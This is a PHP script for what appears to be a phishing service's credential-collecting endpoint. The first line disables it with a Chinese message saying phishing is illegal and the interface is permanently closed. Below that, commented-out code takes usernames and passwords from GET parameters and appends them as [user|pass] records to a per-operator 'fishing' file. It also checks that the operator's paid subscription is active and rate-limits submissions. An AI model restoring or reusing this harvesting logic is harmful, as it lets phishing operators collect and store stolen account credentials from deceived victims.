<?php
die('钓鱼违法，永久关闭此接口');
// $admin=$_GET['admin'];
// $user=$_GET['user'];
// $pass=$_GET['pass'];
// require 'test_test.php';
// //钓鱼系统格式:[账号|密码]
// //获取用户IP

// if(file_exists('adminfrozen/'.$admin)){
// $timesss=file_get_contents('adminfrozen/'.$admin);
// if($timesss>time()-1){
// $frozen='true';
// $timesss=$timesss-time()+1;//剩余多久可操作
// }else{$frozen=='false';}
// }else{$frozen=='false';}
// if($frozen!='true'){


// if(is_dir('userss/'.$admin)&&$admin!=''){
// if(strlen($user)<=10&&strlen($user)>=5){
// if(strlen($pass)<=16&&strlen($pass)>=6){
// if(!preg_match("/[\x7f-\xff]/", $user)&&!preg_match("/[\x7f-\xff]/", $pass)&&strpos($user,'|')===false&&strpos($user,'[')===false&&strpos($user,']')===false&&strpos($pass,'|')===false&&strpos($pass,'[')===false&&strpos($pass,']')===false){
// if(file_get_contents('userss/'.$admin.'/admin/viptime')>time()){
// if(file_exists('userss/'.$admin.'/admin/data/fishing')){$fishing=file_get_contents('userss/'.$admin.'/admin/data/fishing');}else{$fishing='';}
// $fishing='['.$user.'|'.$pass.']'.$fishing;
// file_put_contents('userss/'.$admin.'/admin/data/fishing',$fishing);
// file_put_contents('adminfrozen/'.$admin,time());
// echo '提交成功';
// }else{echo '后台账号过期，无法提交';}
// }else{echo '请输入正确的账号和密码';}
// }else{echo '密码长度需在6-16之间';}
// }else{echo '账号长度需在5-10之间';}
// }else{echo '后台账号不存在';}
// }else{echo '频繁操作，请'.$timesss.'秒后重试';}
?>